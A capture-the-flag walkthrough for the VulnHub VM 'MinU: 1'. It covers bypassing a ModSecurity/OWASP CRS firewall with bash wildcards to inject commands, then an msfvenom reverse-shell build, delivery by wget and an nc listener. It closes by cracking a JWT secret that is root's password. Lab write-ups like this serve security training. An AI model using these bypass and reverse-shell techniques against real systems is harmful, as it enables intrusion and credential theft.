---
layout: post
title: "MinU: 1 Walkthrough"
subtitle: "O, wasp!"
date: 2018-09-11 08:10:53 +0000
category: Walkthrough
tags: [VulnHub, MinU]
comments: true
image:
  feature: minu-1-walkthrough.jpg
  credit: umsiedlungen / Pixabay
  creditlink: https://pixabay.com/en/insect-wasps-hornets-hornissennest-3270233/
---

This post documents the complete walkthrough of MinU: 1, a boot2root [VM][1] created by [8bitsec][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

This boot2root is an Ubuntu Based virtual machine and has been tested using VirtualBox. The network interface of the virtual machine will take it's IP settings from DHCP. Your goal is to capture the flag on `/root`.

## Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
...
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.27
|_http-server-header: Apache/2.4.27 (Ubuntu)
|_http-title: 403 Forbidden
```

This should be fun. `nmap` finds one open port: `80/tcp`.

### Directory/File Enumeration

Let's use `wfuzz` to fuzz the site and see what we are up against.

![ad2513b7.png](/assets/images/posts/minu-1-walkthrough/ad2513b7.png)

Something's up. There's way too many `403`s. Probably some Rewrite rules and/or a Web Application Firewall (WAF) are in place.

![cfa688d8.png](/assets/images/posts/minu-1-walkthrough/cfa688d8.png)

Now, this is more like it.

### ModSecurity (OWASP CRS)

Let's use `wafw00f` to determine if there's a WAF in place.

![c7c5625b.png](/assets/images/posts/minu-1-walkthrough/c7c5625b.png)

Damn.

Let's not get too hung up on the WAF. Check out the HTML source code of `/test.php`.

![a4e318e4.png](/assets/images/posts/minu-1-walkthrough/a4e318e4.png)

Looks like there's an intention to delay loading with JavaScript. Let's disable JavaScript.

![0cbd15e7.png](/assets/images/posts/minu-1-walkthrough/0cbd15e7.png)

No js yay! But, are we looking at a Local File Inclusion (LFI) vulnerability here?

![a675067c.png](/assets/images/posts/minu-1-walkthrough/a675067c.png)

![db603633.png](/assets/images/posts/minu-1-walkthrough/db603633.png)

Anyway, long story short. It's not LFI, it's something else—remote command execution. Basically, this is an exercise in bypassing OWASP CRS.

### Remote Command Execution

Don't believe it? Look here.

![825b6ba6.png](/assets/images/posts/minu-1-walkthrough/825b6ba6.png)

What do you see? The `file` parameter accepts a pipe (`|`) character and the `rev` command, resulting in the contents of `last.html` reversed. You know what, it's always better to see it in `curl`.

![2ae77265.png](/assets/images/posts/minu-1-walkthrough/2ae77265.png)

Voila. This is indeed an exercise to bypass OWASP CRS to execute commands.

A tutorial on how ModSecurity and OWASP CRS work is beyond the scope of this walkthrough. Suffice to say, they work based on pattern matching hella of complex looking regular expressions.

Because `bash` enables wildcards (asterisk `*` and question mark `?`) for globbing in the VM, we can leverage that to bypass the OWASP CRS filters.

Here's an example to view `/etc/passwd`.

![bddf976d.png](/assets/images/posts/minu-1-walkthrough/bddf976d.png)

Here's an example to execute the `ls` command.

![4d486a76.png](/assets/images/posts/minu-1-walkthrough/4d486a76.png)

## Low-Privilege Shell

We can now make use of the above to give ourselves a low-privilege shell. We'll pull a reverse shell (generated with `msfvenom`) with `wget`, but first we need to determine whether the OS is 32-bit or 64-bit with `uname`.

![0e944f46.png](/assets/images/posts/minu-1-walkthrough/0e944f46.png)

Generate a reverse shell with `msfvenom`.

```
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.30.128 LPORT=1234 -f elf -o rev
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of elf file: 152 bytes
Saved as: rev
```

Host it with Python's SimpleHTTPServer.

```
# python -m SimpleHTTPServer 80
```
Download the reverse shell like so.

![61a81256.png](/assets/images/posts/minu-1-walkthrough/61a81256.png)

Check if the download was successful.

![3e850ebc.png](/assets/images/posts/minu-1-walkthrough/3e850ebc.png)

Now, make `rev` executable with `chmod`.

![86487420.png](/assets/images/posts/minu-1-walkthrough/86487420.png)

![7b89128e.png](/assets/images/posts/minu-1-walkthrough/7b89128e.png)

Time to execute the reverse shell. Before we do that, let's set up our `nc` listener.

![e8ba719c.png](/assets/images/posts/minu-1-walkthrough/e8ba719c.png)

Hooray. A shell at last.

![911cdd4d.png](/assets/images/posts/minu-1-walkthrough/911cdd4d.png)

## Privilege Escalation

During enumeration of `bob`'s account, I noticed the presence of a JSON web token (JWT) in `/home/bob/._pw_`. Here's how it looks like.

![7ae14d04.png](/assets/images/posts/minu-1-walkthrough/7ae14d04.png)

JWT has three parts in this format:

```
base64(header).base64(payload).base64(signature)
```

1. `header` specifies the algorithm and the type in JSON.
2. `payload` specifies the claim of the token, also in JSON.
3. `signature` is the digital signature of the encoded header and payload.

There's a online [debugger](https://jwt.io/#debugger) that we can use to find out the header and payload.

![bb1a57ab.png](/assets/images/posts/minu-1-walkthrough/bb1a57ab.png)

Judging by the file name, I guess we need to crack the JWT to determine the secret used in HS256 to create the signature.

### JWT Cracker

Searching for "jwt crack github" in Google gave plenty of results. I decided on [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) based on performance considerations—it's multi-threaded and written in C.

Cracking the JWT with it, is crazy fast compared to the rest.

![0aecce8c.png](/assets/images/posts/minu-1-walkthrough/0aecce8c.png)

### What's the Flag (WTF)

It turns out that the secret is `root`'s password. With that, getting the flag is trivial.

![f5afe660.png](/assets/images/posts/minu-1-walkthrough/f5afe660.png)

:dancer:

## Afterthought

I had a fun time trying out different JWT crackers. :laughing:

[1]: https://www.vulnhub.com/entry/minu-1,235/
[2]: https://twitter.com/@_8bitsec
[3]: https://www.vulnhub.com/
